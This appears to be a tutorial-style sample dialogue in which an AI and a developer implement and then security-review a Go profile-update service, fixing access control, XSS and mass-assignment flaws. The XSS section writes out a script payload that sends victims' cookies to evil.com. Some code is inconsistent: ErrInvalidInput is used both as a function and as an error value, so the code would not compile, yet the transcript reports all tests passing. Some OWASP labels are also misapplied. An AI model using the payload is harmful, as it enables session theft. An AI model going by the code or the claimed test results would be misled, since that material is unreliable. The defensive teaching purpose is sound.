# Example Conversation: Security Review During Implementation

**Scenario:** Implementing user profile update (PROJ-2456)
**Focus:** Catching security vulnerabilities during interactive review
**Duration:** ~30 minutes
**Outcome:** Multiple security issues identified and fixed collaboratively

---

## Initial Implementation

**Developer:** Let's implement the user profile update from PROJ-2456

**AI:** Planning implementation...

[Reads context files, introspects dependencies]

Plan ready. Creating UpdateProfileService. Proceeding with TDD?

---

**Developer:** Yes, write the test first

**AI:** Writing unit test for successful profile update...

```go
func TestUpdateProfileService_Update_Success(t *testing.T) {
    mockUserRepo := mocks.NewUserRepository(t)
    service := services.NewUpdateProfileService(mockUserRepo)

    profile := &domain.UserProfile{
        UserID:    "user-123",
        FirstName: "John",
        LastName:  "Doe",
        Bio:       "Software engineer",
    }

    mockUserRepo.EXPECT().
        UpdateProfile(mock.Anything, profile).
        Return(nil)

    err := service.Update(context.Background(), "user-123", profile)
    assert.NoError(t, err)
}
```

Test written. Running...

```
FAIL: undefined: services.NewUpdateProfileService
```

Test fails as expected. Implementing service...

---

**AI:** Implementation:

```go
func (s *UpdateProfileService) Update(ctx context.Context, userID string, profile *domain.UserProfile) error {
    // Set the user ID from parameter
    profile.UserID = userID

    // Update in database
    return s.userRepo.UpdateProfile(ctx, profile)
}
```

Test passes. Implementation complete.

---

## Security Review Dialogue

**Developer:** Wait—review this for security issues before we continue

**AI:** Analyzing implementation against OWASP Top 10 and architecture.md security requirements...

**Critical Security Issues Found:**

### 1. Broken Access Control (OWASP #1)
**Issue:** No authorization check—any user can update any other user's profile
```go
// VULNERABLE: No check that authenticated user matches target userID
func (s *UpdateProfileService) Update(ctx context.Context, userID string, profile *domain.UserProfile) error {
    profile.UserID = userID  // Attacker could supply any userID
    return s.userRepo.UpdateProfile(ctx, profile)
}
```

**Attack scenario:**
- User A (authenticated) calls API: `PUT /users/user-B/profile`
- Service accepts `userID="user-B"` without checking if User A owns that profile
- User A can modify User B's profile

**Fix needed:** Extract authenticated user from context, verify ownership

---

### 2. Injection (OWASP #3)
**Issue:** No input sanitization on bio field (XSS risk if displayed in HTML)
```go
// VULNERABLE: Bio field not sanitized
Bio: "Software engineer"  // Could be: "<script>alert('xss')</script>"
```

**Attack scenario:**
- Attacker sets bio to: `<script>document.location='http://evil.com?cookie='+document.cookie</script>`
- When victim views profile page, script executes
- Attacker steals session cookie

**Fix needed:** HTML sanitization on bio field (and all text fields displayed in HTML)

---

### 3. Sensitive Data Exposure (OWASP #2)
**Issue:** No validation on profile data—could expose internal fields
```go
// VULNERABLE: Blindly accepting profile struct
// What if attacker adds: IsAdmin=true, IsBanned=false, etc?
```

**Attack scenario:**
- Attacker sends: `{"firstName": "John", "isAdmin": true, "role": "superadmin"}`
- If UserProfile struct has these fields and we're not validating, they could be set
- Privilege escalation

**Fix needed:** Explicit field validation—only update allowed fields

---

**Developer:** Those are serious. Fix all three

---

## Fixing Security Issues

**AI:** Fixing issues...

### Fix 1: Add Authorization Check

```go
func (s *UpdateProfileService) Update(ctx context.Context, userID string, profile *domain.UserProfile) error {
    // Extract authenticated user from context
    authUser := auth.UserFromContext(ctx)
    if authUser == nil {
        return ErrUnauthorized
    }

    // Verify authenticated user owns this profile
    if authUser.ID != userID {
        return ErrForbidden // Can't update someone else's profile
    }

    profile.UserID = userID
    return s.userRepo.UpdateProfile(ctx, profile)
}
```

---

### Fix 2: Sanitize HTML in Text Fields

```go
import "html"

func (s *UpdateProfileService) Update(ctx context.Context, userID string, profile *domain.UserProfile) error {
    // ... authorization check above ...

    // Sanitize text fields to prevent XSS
    profile.FirstName = html.EscapeString(profile.FirstName)
    profile.LastName = html.EscapeString(profile.LastName)
    profile.Bio = html.EscapeString(profile.Bio)

    profile.UserID = userID
    return s.userRepo.UpdateProfile(ctx, profile)
}
```

---

### Fix 3: Explicit Field Validation (Allowlist Approach)

```go
func (s *UpdateProfileService) Update(ctx context.Context, userID string, req *UpdateProfileRequest) error {
    // ... authorization check ...

    // Load existing profile
    existing, err := s.userRepo.GetProfile(ctx, userID)
    if err != nil {
        return fmt.Errorf("loading profile: %w", err)
    }

    // ALLOWLIST: Only update explicitly allowed fields
    // This prevents tampering with IsAdmin, Role, IsBanned, etc.
    if req.FirstName != nil {
        existing.FirstName = html.EscapeString(*req.FirstName)
    }
    if req.LastName != nil {
        existing.LastName = html.EscapeString(*req.LastName)
    }
    if req.Bio != nil {
        existing.Bio = html.EscapeString(*req.Bio)
    }

    // Internal fields (IsAdmin, Role, etc.) are NEVER touched
    return s.userRepo.UpdateProfile(ctx, existing)
}
```

---

**Developer:** Better. But also add input validation—check max lengths

**AI:** Adding validation rules from architecture.md...

```go
func (s *UpdateProfileService) Update(ctx context.Context, userID string, req *UpdateProfileRequest) error {
    // ... authorization check ...

    // Validate inputs
    if req.FirstName != nil {
        if len(*req.FirstName) > 50 {
            return ErrInvalidInput("first name too long (max 50 characters)")
        }
        if len(*req.FirstName) == 0 {
            return ErrInvalidInput("first name cannot be empty")
        }
    }

    if req.LastName != nil {
        if len(*req.LastName) > 50 {
            return ErrInvalidInput("last name too long (max 50 characters)")
        }
        if len(*req.LastName) == 0 {
            return ErrInvalidInput("last name cannot be empty")
        }
    }

    if req.Bio != nil {
        if len(*req.Bio) > 500 {
            return ErrInvalidInput("bio too long (max 500 characters)")
        }
    }

    // ... rest of implementation ...
}
```

---

**Developer:** Good. Now update the unit tests to cover these security scenarios

**AI:** Adding security test cases:

```go
func TestUpdateProfileService_Update_Unauthorized(t *testing.T) {
    mockUserRepo := mocks.NewUserRepository(t)
    service := services.NewUpdateProfileService(mockUserRepo)

    // Authenticated as user-123, trying to update user-456
    ctx := auth.WithUser(context.Background(), &domain.User{ID: "user-123"})

    req := &UpdateProfileRequest{
        FirstName: stringPtr("Malicious"),
    }

    err := service.Update(ctx, "user-456", req) // Different user ID!

    assert.Equal(t, ErrForbidden, err) // Should reject
}

func TestUpdateProfileService_Update_XSSPrevention(t *testing.T) {
    mockUserRepo := mocks.NewUserRepository(t)
    service := services.NewUpdateProfileService(mockUserRepo)

    ctx := auth.WithUser(context.Background(), &domain.User{ID: "user-123"})

    mockUserRepo.EXPECT().
        GetProfile(mock.Anything, "user-123").
        Return(&domain.UserProfile{UserID: "user-123"}, nil)

    mockUserRepo.EXPECT().
        UpdateProfile(mock.Anything, mock.MatchedBy(func(p *domain.UserProfile) bool {
            // Verify HTML was escaped
            return !strings.Contains(p.Bio, "<script>")
        })).
        Return(nil)

    req := &UpdateProfileRequest{
        Bio: stringPtr("<script>alert('xss')</script>"),
    }

    err := service.Update(ctx, "user-123", req)

    assert.NoError(t, err)
    // Script tag should have been escaped
}

func TestUpdateProfileService_Update_InputValidation(t *testing.T) {
    service := services.NewUpdateProfileService(nil) // No repo needed for validation

    ctx := auth.WithUser(context.Background(), &domain.User{ID: "user-123"})

    tests := []struct {
        name        string
        request     *UpdateProfileRequest
        expectedErr error
    }{
        {
            name: "first name too long",
            request: &UpdateProfileRequest{
                FirstName: stringPtr(strings.Repeat("a", 51)),
            },
            expectedErr: ErrInvalidInput,
        },
        {
            name: "empty first name",
            request: &UpdateProfileRequest{
                FirstName: stringPtr(""),
            },
            expectedErr: ErrInvalidInput,
        },
        {
            name: "bio too long",
            request: &UpdateProfileRequest{
                Bio: stringPtr(strings.Repeat("a", 501)),
            },
            expectedErr: ErrInvalidInput,
        },
    }

    for _, tt := range tests {
        t.Run(tt.name, func(t *testing.T) {
            err := service.Update(ctx, "user-123", tt.request)
            assert.ErrorIs(t, err, tt.expectedErr)
        })
    }
}
```

---

**Developer:** Perfect. Run all tests

**AI:** Running tests...

```
--- PASS: TestUpdateProfileService_Update_Success (0.00s)
--- PASS: TestUpdateProfileService_Update_Unauthorized (0.00s)
--- PASS: TestUpdateProfileService_Update_XSSPrevention (0.00s)
--- PASS: TestUpdateProfileService_Update_InputValidation (0.00s)
PASS
ok      github.com/company/app/internal/domain/services    0.006s

Coverage: 92.1% of statements
```

✓ All tests pass
✓ Coverage: 92.1%
✓ Security vulnerabilities addressed

---

## Summary

**Security Issues Found:** 3 critical
**Time to Identify:** < 2 minutes (AI analysis)
**Time to Fix:** ~20 minutes (with test coverage)

**Issues Fixed:**
1. ✅ **Broken Access Control** - Added authorization check (prevents profile tampering)
2. ✅ **XSS Injection** - Added HTML sanitization (prevents script injection)
3. ✅ **Mass Assignment** - Added allowlist validation (prevents privilege escalation)

**Additional Improvements:**
4. ✅ Input validation (length limits, empty checks)
5. ✅ Comprehensive security test coverage

**Key Lesson:**
Security review during implementation caught critical vulnerabilities before code review. Interactive dialogue between developer and AI ensured:
- AI identified vulnerabilities systematically
- Developer validated severity and attack scenarios
- AI implemented fixes with test coverage
- Developer verified fixes were complete

**Without this review:** These vulnerabilities would have reached production.
**With this review:** Caught and fixed in < 30 minutes during development.
